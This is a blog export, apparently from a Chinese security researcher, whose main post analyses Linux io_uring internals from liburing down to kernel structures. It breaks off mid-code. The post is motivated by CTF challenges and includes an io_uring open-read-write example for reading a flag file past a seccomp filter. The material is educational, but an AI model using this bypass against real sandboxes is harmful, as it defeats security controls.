{"meta":{"title":"V3rdant's Blog","subtitle":"","description":"","author":"V3rdant","url":"https://v3rdant.cn","root":"/"},"pages":[{"title":"Tags","date":"2024-01-12T04:02:53.480Z","updated":"2024-01-12T04:02:53.480Z","comments":true,"path":"tags/index.html","permalink":"https://v3rdant.cn/tags/index.html","excerpt":"","text":""},{"title":"About","date":"2024-01-12T08:29:15.841Z","updated":"2024-01-12T08:29:15.841Z","comments":false,"path":"about/index.html","permalink":"https://v3rdant.cn/about/index.html","excerpt":"","text":""},{"title":"Categories","date":"2024-01-12T04:02:53.480Z","updated":"2024-01-12T04:02:53.480Z","comments":true,"path":"categories/index.html","permalink":"https://v3rdant.cn/categories/index.html","excerpt":"","text":""},{"title":"Links","date":"2023-05-20T13:50:09.077Z","updated":"2023-05-20T13:50:09.077Z","comments":false,"path":"links/index.html","permalink":"https://v3rdant.cn/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-04-25T07:27:03.633Z","updated":"2023-04-25T07:27:03.633Z","comments":false,"path":"repository/index.html","permalink":"https://v3rdant.cn/repository/index.html","excerpt":"","text":""}],"posts":[{"title":"Linux.io_uring-Top-down-Approch","slug":"Linux.io_uring-Top-down-Approch","date":"2023-12-04T06:08:56.000Z","updated":"2023-12-07T02:11:35.215Z","comments":true,"path":"Linux.io_uring-Top-down-Approch/","link":"","permalink":"https://v3rdant.cn/Linux.io_uring-Top-down-Approch/","excerpt":"","text":"最近在N1线下赛遇见一个seccomp沙箱，限制了只能使用 io_uring_setup 一个系统调用，之前不久的ACTF中， 使用mmap、io_uring_setup、io_uring_enter 三个系统调用，完成了orw。 如何仅仅使用 io_uring_setup 完成orw呢？ 本文将不仅仅局限于CTF，而是从io_uring的实现出发，先从宏观角度透视io_uring的实现框架， 然后以源代码为基础，自顶向下，从liburing，io_uring的用户态接口， 最后到io_uring的内核实现，一步步聚焦 io_uring 具体的实现。 由于笔者为安全方向，因此笔者将更多关注 io_uring 中用户和内核态的通信这一容易产生安全漏洞的模块，而不会聚焦io_uring的异步调度和任务处理，以上。 overview 在开始前，首先介绍一下什么是io_uring 。 io_uring 是 Linux 5.1 引入的一套新的异步 I/O 接口机制,主要有以下特点: 高效 - 通过共享内存和锁自由的接口设计大大降低了系统调用开销。 灵活 - 支持阻塞,非阻塞,轮询多种调用方式,可以同时提交多个 I/O 请求并通过轮询或异步方式得到完成通知。 通用 - 支持文件,网络,时间,引用计数等多种 I/O,统一了异步 I/O 接口。 io_uring 主要由提交队列(SQ)、完成队列(CQ)、SQEs 请求和 CQEs 结果组成。 其中SQE和CQE 分别是SQ和CQ中的一个实体。 应用通过mmap映射SQ和CQ,向SQ提交I/O请求,再通过读CQ获取I/O完成结果。这避免了大量的 context switch 和系统调用开销。 这里以ACTF星盟的师傅写的liburing实现orw的一个小例子来介绍一下io_uring 的工作原理 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131// ref from https://blog.xmcve.com/2023/10/31/ACTF-2023-Writeup/#title-9#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;liburing.h&gt;#include &lt;unistd.h&gt;#include &lt;syscall.h&gt;#include &lt;sys/prctl.h&gt;#define QUEUE_DEPTH 1int main() &#123; struct io_uring ring = &#123;0&#125;; struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; int fd, ret; char buffer[4096] = &#123;0&#125;; if (io_uring_queue_init(QUEUE_DEPTH, &amp;ring, 0) &lt; 0) &#123; perror(&quot;io_uring_queue_init&quot;); return 1; &#125; // 准备打开操作 sqe = io_uring_get_sqe(&amp;ring); if (!sqe) &#123; fprintf(stderr, &quot;Failed to get SQE\\n&quot;); return 1; &#125; int dirfd = AT_FDCWD; // 当前工作目录的文件描述符 const char *pathname = &quot;./flag&quot;; int flags = O_RDONLY; io_uring_prep_openat(sqe, dirfd, pathname, flags, 0); io_uring_sqe_set_data(sqe, NULL); // 提交请求 ret = io_uring_submit(&amp;ring); if (ret &lt; 0) &#123; perror(&quot;io_uring_submit&quot;); return 1; &#125; // 等待完成 ret = io_uring_wait_cqe(&amp;ring, &amp;cqe); if (ret &lt; 0) &#123; perror(&quot;io_uring_wait_cqe&quot;); return 1; &#125; // 处理完成的请求 if (cqe-&gt;res &lt; 0) &#123; fprintf(stderr, &quot;Open error: %d\\n&quot;, cqe-&gt;res); return 1; &#125; fd = cqe-&gt;res; // 获取打开的文件描述符 // 准备读取操作 sqe = io_uring_get_sqe(&amp;ring); if (!sqe) &#123; fprintf(stderr, &quot;Failed to get SQE\\n&quot;); return 1; &#125; io_uring_prep_read(sqe, fd, buffer, sizeof(buffer), 0); io_uring_sqe_set_data(sqe, NULL); // 提交请求 ret = io_uring_submit(&amp;ring); if (ret &lt; 0) &#123; perror(&quot;io_uring_submit&quot;); return 1; &#125; // 等待完成 ret = io_uring_wait_cqe(&amp;ring, &amp;cqe); if (ret &lt; 0) &#123; perror(&quot;io_uring_wait_cqe&quot;); return 1; &#125; // 处理完成的请求 if (cqe-&gt;res &lt; 0) &#123; fprintf(stderr, &quot;Read error: %d\\n&quot;, cqe-&gt;res); return 1; &#125; // 准备写操作 sqe = io_uring_get_sqe(&amp;ring); if (!sqe) &#123; fprintf(stderr, &quot;Failed to get SQE\\n&quot;); return 1; &#125; io_uring_prep_write(sqe, 1, buffer, strlen(buffer), 0); io_uring_sqe_set_data(sqe, NULL); // 提交请求 ret = io_uring_submit(&amp;ring); if (ret &lt; 0) &#123; perror(&quot;io_uring_submit&quot;); return 1; &#125; // 等待完成 ret = io_uring_wait_cqe(&amp;ring, &amp;cqe); if (ret &lt; 0) &#123; perror(&quot;io_uring_wait_cqe&quot;); return 1; &#125; // 处理完成的请求 if (cqe-&gt;res &lt; 0) &#123; fprintf(stderr, &quot;Read error: %d\\n&quot;, cqe-&gt;res); return 1; &#125; // printf(&quot;Read %d bytes: %s\\n&quot;, cqe-&gt;res, buffer); // 清理并关闭文件 io_uring_cqe_seen(&amp;ring, cqe); io_uring_queue_exit(&amp;ring); close(fd); sleep(1); return 0;&#125; 可以看到，如果要使用io_uring会经历如下流程： 首先通过 io_uring_queue_init 完成了初始化，io_uring的sq和cq队列也被创建 在库内部实际上是使用 io_uring_setup 和 mmap 两个syscall实现 前者完成了内核中相应结构体和资源的创建，后者将两个队列映射到用户态内存，通过共享内存方便用户态访问 1234if (io_uring_queue_init(QUEUE_DEPTH, &amp;ring, 0) &lt; 0) &#123; perror(&quot;io_uring_queue_init&quot;); return 1;&#125; 然后，用户使用 io_uring_get_sqe 得到一个sqe，(SQ队列中的一个实体) ，并根据所要完成的任务，设置sqe的各个成员， 这个过程是完全在用户态完成的 123456789101112sqe = io_uring_get_sqe(&amp;ring);if (!sqe) &#123; fprintf(stderr, &quot;Failed to get SQE\\n&quot;); return 1;&#125;int dirfd = AT_FDCWD; // 当前工作目录的文件描述符const char *pathname = &quot;./flag&quot;;int flags = O_RDONLY;io_uring_prep_openat(sqe, dirfd, pathname, flags, 0);io_uring_sqe_set_data(sqe, NULL); 最后，通过 io_uring_submit 提交了请求，库内部实际上是调用了 io_uring_enter 1ret = io_uring_submit(&amp;ring); io_uring任务收割模式 这里主要解释一下 IORING_SETUP_SQPOLL 和 IORING_SETUP_IOPOLL 的区别 IORING_SETUP_SQPOLL When this flag is specified, a kernel thread is created to perform submission queue polling. An io_uring instance configured in this way enables an application to issue I/O without ever context switching into the kernel. By using the submission queue to fill in new submission queue entries and watching for completions on the completion queue, the application can submit and reap I/Os without doing a single system call. If the kernel thread is idle for more than sq_thread_idle milliseconds, it will set the IORING_SQ_NEED_WAKEUP bit in the flags field of the struct io_sq_ring. When this happens, the application must call io_uring_enter(2) to wake the kernel thread. If I/O is kept busy, the kernel thread will never sleep. An application making use of this feature will need to guard the io_uring_enter(2) call with the following code sequence: /* * Ensure that the wakeup flag is read after the tail pointer * has been written. It’s important to use memory load acquire * semantics for the flags read, as otherwise the application * and the kernel might not agree on the consistency of the * wakeup flag. */ unsigned flags = atomic_load_relaxed(sq_ring-&gt;flags); if (flags &amp; IORING_SQ_NEED_WAKEUP) io_uring_enter(fd, 0, 0, IORING_ENTER_SQ_WAKEUP); IORING_SETUP_IOPOLL Perform busy-waiting for an I/O completion, as opposed to getting notifications via an asynchronous IRQ (Interrupt Request). The file system (if any) and block device must support polling in order for this to work. Busy-waiting provides lower latency, but may consume more CPU resources than interrupt driven I/O. Currently, this feature is usable only on a file descriptor opened using the O_DIRECT flag. When a read or write is submitted to a polled context, the application must poll for completions on the CQ ring by calling io_uring_enter(2). It is illegal to mix and match polled and non-polled I/O on an io_uring instance. This is only applicable for storage devices for now, and the storage device must be configured for polling. How to do that depends on the device type in question. For NVMe devices, the nvme driver must be loaded with the poll_queues parameter set to the desired number of polling queues. The polling queues will be shared appropriately between the CPUs in the system, if the number is less than the number of online CPU threads. 即，SQPOLL 通过内核线程定时唤醒来收割任务 IOPOLL 通过 io_uring_enter 通知内核来收割任务 struct 其次，需要在讲解前，介绍一下 liburing 和 内核暴露出的一些结构体： liburing 首先是 io_uring 这是liburing 关于io_uring的核心管理结构体 12345678910111213struct io_uring &#123; struct io_uring_sq sq; // sq 管理结构体 struct io_uring_cq cq; // cq 管理结构体 unsigned flags; // setup时的flag设置 // 以下setup返回时写入params的一些信息 int ring_fd; unsigned features; int enter_ring_fd; __u8 int_flags; __u8 pad[3]; unsigned pad2;&#125;; io_uring_sq， sq的管理结构体， 这个结构体在6.5及以下的版本可以在内核中找到，在6.5以上的版本在内核中删除了，6.5以上存在io_rings，相当于io_uring_sq和io_uring_cq 的组合 1234567891011121314151617181920212223struct io_uring_sq &#123; unsigned *khead; unsigned *ktail; // Deprecated: use `ring_mask` instead of `*kring_mask` unsigned *kring_mask; // Deprecated: use `ring_entries` instead of `*kring_entries` unsigned *kring_entries; unsigned *kflags; unsigned *kdropped; unsigned *array; struct io_uring_sqe *sqes; unsigned sqe_head; unsigned sqe_tail; size_t ring_sz; void *ring_ptr; unsigned ring_mask; unsigned ring_entries; unsigned pad[2];&#125;; 在此着重解释一下ring_ptr和 sqes两个成员： 这两个成员，在没有设置NO_MMAP的情况下，都是由 io_uring_setup 后用mmap映射得到的。 ring_prt指向一连串内核用来处理io_uring时的信息，例如当前循环队列head和tail， io_uring_setup 返回时会设置 io_uring_params 中的 sq_off 结构，这个结构就记录了各个成员信息，相对于ring_ptr的偏移， 最后在 [[#io_uring_setup_ring_pointers]] 中设置相关变量指向和内核共享的内存区域中对应的偏移。 而sqes，就是真正的共享队列的区域 类似的，存在io_uring_cq 结构体 kernel 首先是io_uring_params 他是io_uring_setup 传入的参数，同时，返回时，kernel会给此结构体相应成员赋值. 此结构体也是提供给用户态的API 12345678910111213struct io_uring_params &#123; __u32 sq_entries; __u32 cq_entries; __u32 flags; __u32 sq_thread_cpu; // 内核任务处理线程占用的cpu __u32 sq_thread_idle; // 内核任务处理线程最大闲置时间， // 见`IORING_SETUP_SQPOLL` __u32 features; __u32 wq_fd; __u32 resv[3]; struct io_sqring_offsets sq_off; struct io_cqring_offsets cq_off;&#125;; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970struct io_uring_sqe &#123; __u8 opcode; /* type of operation for this sqe */ __u8 flags; /* IOSQE_ flags */ __u16 ioprio; /* ioprio for the request */ __s32 fd; /* file descriptor to do IO on */ union &#123; __u64 off; /* offset into file */ __u64 addr2; struct &#123; __u32 cmd_op; __u32 __pad1; &#125;; &#125;; union &#123; __u64 addr; /* pointer to buffer or iovecs */ __u64 splice_off_in; &#125;; __u32 len; /* buffer size or number of iovecs */ union &#123; __kernel_rwf_t rw_flags; __u32 fsync_flags; __u16 poll_events; /* compatibility */ __u32 poll32_events; /* word-reversed for BE */ __u32 sync_range_flags; __u32 msg_flags; __u32 timeout_flags; __u32 accept_flags; __u32 cancel_flags; __u32 open_flags; __u32 statx_flags; __u32 fadvise_advice; __u32 splice_flags; __u32 rename_flags; __u32 unlink_flags; __u32 hardlink_flags; __u32 xattr_flags; __u32 msg_ring_flags; __u32 uring_cmd_flags; &#125;; __u64 user_data; /* data to be passed back at completion time */ /* pack this to avoid bogus arm OABI complaints */ union &#123; /* index into fixed buffers, if used */ __u16 buf_index; /* for grouped buffer selection */ __u16 buf_group; &#125; __attribute__((packed)); /* personality to use, if used */ __u16 personality; union &#123; __s32 splice_fd_in; __u32 file_index; struct &#123; __u16 addr_len; __u16 __pad3[1]; &#125;; &#125;; union &#123; struct &#123; __u64 addr3; __u64 __pad2[1]; &#125;; /* * If the ring is initialized with IORING_SETUP_SQE128, then * this field is used for 80 bytes of arbitrary command data */ __u8 cmd[0]; &#125;;&#125;; io_uring_sqe , 用来表征一个IO任务的sqe, 通过在sqes 环形队列上插入此结构体, 实现内核任务的提交. 其中大部分参数都是提交给相应的任务处理函数的参数. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970struct io_uring_sqe &#123; __u8 opcode; // 任务的类型, 用一系列枚举变量来表示 __u8 flags; // 任务的一些标志位, 可以设置任务的一些特性 __u16 ioprio; /* ioprio for the request */ __s32 fd; /* file descriptor to do IO on */ union &#123; __u64 off; /* offset into file */ __u64 addr2; struct &#123; __u32 cmd_op; __u32 __pad1; &#125;; &#125;; union &#123; __u64 addr; /* pointer to buffer or iovecs */ __u64 splice_off_in; &#125;; __u32 len; /* buffer size or number of iovecs */ union &#123; __kernel_rwf_t rw_flags; __u32 fsync_flags; __u16 poll_events; /* compatibility */ __u32 poll32_events; /* word-reversed for BE */ __u32 sync_range_flags; __u32 msg_flags; __u32 timeout_flags; __u32 accept_flags; __u32 cancel_flags; __u32 open_flags; __u32 statx_flags; __u32 fadvise_advice; __u32 splice_flags; __u32 rename_flags; __u32 unlink_flags; __u32 hardlink_flags; __u32 xattr_flags; __u32 msg_ring_flags; __u32 uring_cmd_flags; &#125;; __u64 user_data; /* data to be passed back at completion time */ /* pack this to avoid bogus arm OABI complaints */ union &#123; /* index into fixed buffers, if used */ __u16 buf_index; /* for grouped buffer selection */ __u16 buf_group; &#125; __attribute__((packed)); /* personality to use, if used */ __u16 personality; union &#123; __s32 splice_fd_in; __u32 file_index; struct &#123; __u16 addr_len; __u16 __pad3[1]; &#125;; &#125;; union &#123; struct &#123; __u64 addr3; __u64 __pad2[1]; &#125;; /* * If the ring is initialized with IORING_SETUP_SQE128, then * this field is used for 80 bytes of arbitrary command data */ __u8 cmd[0]; &#125;;&#125;; io_ring_ctx 是kernel io_uring运行的上下文，记录了io_uring 运行时需要保存的一些信息，这里就不一一分析每个成员了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188struct io_ring_ctx &#123; /* const or read-mostly hot data */ struct &#123; unsigned int flags; unsigned int drain_next: 1; unsigned int restricted: 1; unsigned int off_timeout_used: 1; unsigned int drain_active: 1; unsigned int has_evfd: 1; /* all CQEs should be posted only by the submitter task */ unsigned int task_complete: 1; unsigned int lockless_cq: 1; unsigned int syscall_iopoll: 1; unsigned int poll_activated: 1; unsigned int drain_disabled: 1; unsigned int compat: 1; struct task_struct *submitter_task; struct io_rings *rings; struct percpu_ref refs; enum task_work_notify_mode notify_method; &#125; ____cacheline_aligned_in_smp; /* submission data */ struct &#123; struct mutex uring_lock; /* * Ring buffer of indices into array of io_uring_sqe, which is * mmapped by the application using the IORING_OFF_SQES offset. * * This indirection could e.g. be used to assign fixed * io_uring_sqe entries to operations and only submit them to * the queue when needed. * * The kernel modifies neither the indices array nor the entries * array. */ u32 *sq_array; struct io_uring_sqe *sq_sqes; unsigned cached_sq_head; unsigned sq_entries; /* * Fixed resources fast path, should be accessed only under * uring_lock, and updated through io_uring_register(2) */ struct io_rsrc_node *rsrc_node; atomic_t cancel_seq; struct io_file_table file_table; unsigned nr_user_files; unsigned nr_user_bufs; struct io_mapped_ubuf **user_bufs; struct io_submit_state submit_state; struct io_buffer_list *io_bl; struct xarray io_bl_xa; struct io_hash_table cancel_table_locked; struct io_alloc_cache apoll_cache; struct io_alloc_cache netmsg_cache; /* * -&gt;iopoll_list is protected by the ctx-&gt;uring_lock for * io_uring instances that don&#x27;t use IORING_SETUP_SQPOLL. * For SQPOLL, only the single threaded io_sq_thread() will * manipulate the list, hence no extra locking is needed there. */ struct io_wq_work_list iopoll_list; bool poll_multi_queue; &#125; ____cacheline_aligned_in_smp; struct &#123; /* * We cache a range of free CQEs we can use, once exhausted it * should go through a slower range setup, see __io_get_cqe() */ struct io_uring_cqe *cqe_cached; struct io_uring_cqe *cqe_sentinel; unsigned cached_cq_tail; unsigned cq_entries; struct io_ev_fd __rcu *io_ev_fd; unsigned cq_extra; &#125; ____cacheline_aligned_in_smp; /* * task_work and async notification delivery cacheline. Expected to * regularly bounce b/w CPUs. */ struct &#123; struct llist_head work_llist; unsigned long check_cq; atomic_t cq_wait_nr; atomic_t cq_timeouts; struct wait_queue_head cq_wait; &#125; ____cacheline_aligned_in_smp; /* timeouts */ struct &#123; spinlock_t timeout_lock; struct list_head timeout_list; struct list_head ltimeout_list; unsigned cq_last_tm_flush; &#125; ____cacheline_aligned_in_smp; struct io_uring_cqe completion_cqes[16]; spinlock_t completion_lock; /* IRQ completion list, under -&gt;completion_lock */ struct io_wq_work_list locked_free_list; unsigned int locked_free_nr; struct list_head io_buffers_comp; struct list_head cq_overflow_list; struct io_hash_table cancel_table; const struct cred *sq_creds; /* cred used for __io_sq_thread() */ struct io_sq_data *sq_data; /* if using sq thread polling */ struct wait_queue_head sqo_sq_wait; struct list_head sqd_list; unsigned int file_alloc_start; unsigned int file_alloc_end; struct xarray personalities; u32 pers_next; struct list_head io_buffers_cache; /* Keep this last, we don&#x27;t need it for the fast path */ struct wait_queue_head poll_wq; struct io_restriction restrictions; /* slow path rsrc auxilary data, used by update/register */ struct io_mapped_ubuf *dummy_ubuf; struct io_rsrc_data *file_data; struct io_rsrc_data *buf_data; /* protected by -&gt;uring_lock */ struct list_head rsrc_ref_list; struct io_alloc_cache rsrc_node_cache; struct wait_queue_head rsrc_quiesce_wq; unsigned rsrc_quiesce; struct list_head io_buffers_pages; #if defined(CONFIG_UNIX) struct socket *ring_sock; #endif /* hashed buffered write serialization */ struct io_wq_hash *hash_map; /* Only used for accounting purposes */ struct user_struct *user; struct mm_struct *mm_account; /* ctx exit and cancelation */ struct llist_head fallback_llist; struct delayed_work fallback_work; struct work_struct exit_work; struct list_head tctx_list; struct completion ref_comp; /* io-wq management, e.g. thread count */ u32 iowq_limits[2]; bool iowq_limits_set; struct callback_head poll_wq_task_work; struct list_head defer_list; unsigned sq_thread_idle; /* protected by -&gt;completion_lock */ unsigned evfd_last_cq_tail; /* * If IORING_SETUP_NO_MMAP is used, then the below holds * the gup&#x27;ed pages for the two rings, and the sqes. */ unsigned short n_ring_pages; unsigned short n_sqe_pages; struct page **ring_pages; struct page **sqe_pages;&#125;; liburing liburing 提供的核心接口有如下函数: io_uring_queue_init io_uring的初始化结构，用来初始化一个 io_uring 结构体 io_uring_prep_xxx 用来创建一个任务 io_uring_submit 用来提交一个任务 io_uring_queue_init 参数: entries: sq队列大小 rings: io_uring 结构体, liburing提供给用户态的管理结构 flags: 传递给 io_uring_setup 的 params 中的 flag, 用来控制创建的io_uring的特性, 详情可以看 io_uring_set_up 返回值: fd: 用来mmap的fd 12345678910__cold int io_uring_queue_init(unsigned entries, struct io_uring *ring, unsigned flags)&#123; struct io_uring_params p; memset(&amp;p, 0, sizeof(p)); p.flags = flags; return io_uring_queue_init_params(entries, ring, &amp;p);&#125; 接下来是一系列调用链: 1234--&gt;io_uring_queue_init --&gt;io_uring_queue_init_params --&gt;io_uring_queue_init_try_nosqarr --&gt;__io_uring_queue_init_params 最后到 __io_uring_queue_init_params 其中 p 是要传递给 io_uring_setup 的params, buf 的使用将在后面分析. 123456789101112131415161718int __io_uring_queue_init_params(unsigned entries, struct io_uring *ring, struct io_uring_params *p, void *buf, size_t buf_size)&#123; int fd, ret = 0; unsigned *sq_array; unsigned sq_entries, index; memset(ring, 0, sizeof(*ring)); /* * The kernel does this check already, but checking it here allows us * to avoid handling it below. */ if (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP)) return -EINVAL; // 如果设置了REGISTERED_FD_ONLY 就必须要设置 NO_MMAP 对于设置了NO_MMAP的请求，通过 io_uring_alloc_huge 进行了预处理，这个函数我们将在之后[[#io_uring_alloc_huge]]进行分析 123456789if (p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &#123; ret = io_uring_alloc_huge(entries, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq, buf, buf_size); if (ret &lt; 0) return ret; if (buf) ring-&gt;int_flags |= INT_FLAG_APP_MEM;&#125;// 如果设置了NO_MMAP，就要预先分配大内存 接下来就是调用io_uring_setup 完成真正的初始化操作了。 1234567891011fd = __sys_io_uring_setup(entries, p);// syscall(__NR_io_uring_setup, entries, p) if (fd &lt; 0) &#123; if ((p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &amp;&amp; !(ring-&gt;int_flags &amp; INT_FLAG_APP_MEM)) &#123; __sys_munmap(ring-&gt;sq.sqes, 1); io_uring_unmap_rings(&amp;ring-&gt;sq, &amp;ring-&gt;cq); &#125; return fd;&#125;// 错误处理 对于没有设置 NO_MMAP 的情形，需要在此时mmap为sq和cq在用户态映射内存[[#io_uring_queue_mmap]]，反之，直接设置ring相关指针[[#io_uring_setup_ring_pointers]] 123456789if (!(p-&gt;flags &amp; IORING_SETUP_NO_MMAP)) &#123; ret = io_uring_queue_mmap(fd, p, ring); if (ret) &#123; __sys_close(fd); return ret; &#125;&#125; else &#123; io_uring_setup_ring_pointers(p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);&#125; 之后，是将io_uring_setup 设置在 params 中的各种变量复制到用户态管理结构体ring中。 12345678910111213141516171819202122 sq_entries = ring-&gt;sq.ring_entries; if (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123; sq_array = ring-&gt;sq.array; for (index = 0; index &lt; sq_entries; index++) sq_array[index] = index; &#125; ring-&gt;features = p-&gt;features; // io_uring 的 特性 ring-&gt;flags = p-&gt;flags; // io_uring 设置的标志 ring-&gt;enter_ring_fd = fd; // 返回的fd if (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY) &#123; ring-&gt;ring_fd = -1; ring-&gt;int_flags |= INT_FLAG_REG_RING | INT_FLAG_REG_REG_RING; &#125; else &#123; ring-&gt;ring_fd = fd; &#125; return ret;&#125; io_uring_alloc_huge io_uring_alloc_huge 是对于设置了NO_MMAP的程序，预先在用户态设置好SQ和CQ的内存的函数 首先是会用到的各种参数和变量 1234567891011static int io_uring_alloc_huge(unsigned entries, struct io_uring_params *p, struct io_uring_sq *sq, struct io_uring_cq *cq, void *buf, size_t buf_size)&#123; unsigned long page_size = get_page_size(); unsigned sq_entries, cq_entries; size_t ring_mem, sqes_mem; unsigned long mem_used = 0; void *ptr; int ret; 接下来是首先确定了sq和eq entrie的数量。这里具体的算法就不在这里分析了，主要包括合法性检查和幂2向上取整的运算等。 123ret = get_sq_cq_entries(entries, p, &amp;sq_entries, &amp;cq_entries);if (ret) return ret; 接下来就是计算sq和cq需要的内存大小了，计算过程非常直观，笔者就不赘述了： 123456789sqes_mem = sq_entries * sizeof(struct io_uring_sqe);sqes_mem = (sqes_mem + page_size - 1) &amp; ~(page_size - 1);ring_mem = cq_entries * sizeof(struct io_uring_cqe);if (p-&gt;flags &amp; IORING_SETUP_CQE32) ring_mem *= 2;if (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) ring_mem += sq_entries * sizeof(unsigned);mem_used = sqes_mem + ring_mem;mem_used = (mem_used + page_size - 1) &amp; ~(page_size - 1); 接下来，就是真正决定sq和cq的用户态地址了。 首先，如果用户传入了buf，并且buf_size足够大， 那么就设置为用户buf 否则，就mmap出一片内存来使用（根据size计算的不同可能是4K也可能是4M，分别是一页和一个大页(二级页表对应的大小)） 12345678910111213141516171819202122if (!buf &amp;&amp; (sqes_mem &gt; huge_page_size || ring_mem &gt; huge_page_size)) return -ENOMEM;if (buf) &#123; if (mem_used &gt; buf_size) return -ENOMEM; ptr = buf;&#125; else &#123; int map_hugetlb = 0; if (sqes_mem &lt;= page_size) buf_size = page_size; else &#123; buf_size = huge_page_size; map_hugetlb = MAP_HUGETLB; &#125; ptr = __sys_mmap(NULL, buf_size, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS|map_hugetlb, -1, 0); if (IS_ERR(ptr)) return PTR_ERR(ptr);&#125;sq-&gt;sqes = ptr; 并以类似的方式设置了sq-&gt;ring_ptr 123456789101112131415161718192021222324252627282930if (mem_used &lt;= buf_size)&#123; sq-&gt;ring_ptr = (void *)sq-&gt;sqes + sqes_mem; /* clear ring sizes, we have just one mmap() to undo */ cq-&gt;ring_sz = 0; sq-&gt;ring_sz = 0;&#125;else&#123; int map_hugetlb = 0; if (ring_mem &lt;= page_size) buf_size = page_size; else &#123; buf_size = huge_page_size; map_hugetlb = MAP_HUGETLB; &#125; ptr = __sys_mmap(NULL, buf_size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | map_hugetlb, -1, 0); if (IS_ERR(ptr)) &#123; __sys_munmap(sq-&gt;sqes, 1); return PTR_ERR(ptr); &#125; sq-&gt;ring_ptr = ptr; sq-&gt;ring_sz = buf_size; cq-&gt;ring_sz = 0;&#125; 不过下面一部分就是真正重要的了： p正是传入 io_uring_setup 的结构体，所以对p的赋值才是至关重要的，这里的sq和cq不过是 liburing 暴露给用户的管理结构 io_uring 中的一个成员 1234cq-&gt;ring_ptr = (void *)sq-&gt;ring_ptr;p-&gt;sq_off.user_addr = (unsigned long)sq-&gt;sqes;p-&gt;cq_off.user_addr = (unsigned long)sq-&gt;ring_ptr;return (int)mem_used; 所以规根结底就是写入了 p的 sq_off 和 cq_off io_uring_queue_mmap 这是对于没有设置NO_MMAP的情形下，完成了 syscall io_uring_setup 处理后，mmap的流程 123456__cold int io_uring_queue_mmap(int fd, struct io_uring_params *p, struct io_uring *ring)&#123; memset(ring, 0, sizeof(*ring)); return io_uring_mmap(fd, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);&#125; 首先是计算了sq和cq的ring的size 123456789101112static int io_uring_mmap(int fd, struct io_uring_params *p, struct io_uring_sq *sq, struct io_uring_cq *cq)&#123; size_t size; int ret; size = sizeof(struct io_uring_cqe); if (p-&gt;flags &amp; IORING_SETUP_CQE32) size += sizeof(struct io_uring_cqe); sq-&gt;ring_sz = p-&gt;sq_off.array + p-&gt;sq_entries * sizeof(unsigned); cq-&gt;ring_sz = p-&gt;cq_off.cqes + p-&gt;cq_entries * size; 然后开始mmap sq 和 cq ring的指针： 1234567891011121314151617181920212223242526272829if (p-&gt;features &amp; IORING_FEAT_SINGLE_MMAP)&#123; if (cq-&gt;ring_sz &gt; sq-&gt;ring_sz) sq-&gt;ring_sz = cq-&gt;ring_sz; cq-&gt;ring_sz = sq-&gt;ring_sz;&#125;sq-&gt;ring_ptr = __sys_mmap(0, sq-&gt;ring_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQ_RING);// offset = 0if (IS_ERR(sq-&gt;ring_ptr)) return PTR_ERR(sq-&gt;ring_ptr);if (p-&gt;features &amp; IORING_FEAT_SINGLE_MMAP)&#123; cq-&gt;ring_ptr = sq-&gt;ring_ptr;&#125;else&#123; cq-&gt;ring_ptr = __sys_mmap(0, cq-&gt;ring_sz, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_CQ_RING); // offset = 8000000 if (IS_ERR(cq-&gt;ring_ptr)) &#123; ret = PTR_ERR(cq-&gt;ring_ptr); cq-&gt;ring_ptr = NULL; goto err; &#125;&#125; 如果设置了 IORING_FEAT_SINGLE_MMAP ，就可以将sq 和 cq的ring一起mmap，否则，就分别单独mmap 最后再mmap sq的sqes 12345678910111213size = sizeof(struct io_uring_sqe);if (p-&gt;flags &amp; IORING_SETUP_SQE128) size += 64;sq-&gt;sqes = __sys_mmap(0, size * p-&gt;sq_entries, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, IORING_OFF_SQES);if (IS_ERR(sq-&gt;sqes))&#123; ret = PTR_ERR(sq-&gt;sqes);err: io_uring_unmap_rings(sq, cq); return ret;&#125; 最后的最后，设置相关指针 [[#io_uring_setup_ring_pointers]] 1io_uring_setup_ring_pointers(p, sq, cq); io_uring_setup_ring_pointers 此函数用来设置 struct io_uring ring 也就是liburing的核心管理结构体. 我们知道 sq-&gt;ring_ptr 在 kernel被映射到一个内核结构体, 其中结构体各个成员的偏移通过 io_uring_params 的两个 offset 成员结构体返回, 这里通过此拿到结构体对应成员的指针, 并赋值给 sq 和 cq 的各个成员, 这里的 sq 和 cq 又是 管理结构体 ring 的成员 123456789101112131415161718192021222324252627282930313233static void io_uring_setup_ring_pointers(struct io_uring_params *p, struct io_uring_sq *sq, struct io_uring_cq *cq)&#123; sq-&gt;khead = sq-&gt;ring_ptr + p-&gt;sq_off.head; // 设置sq head的指针 sq-&gt;ktail = sq-&gt;ring_ptr + p-&gt;sq_off.tail; // 设置sq tail指针 sq-&gt;kring_mask = 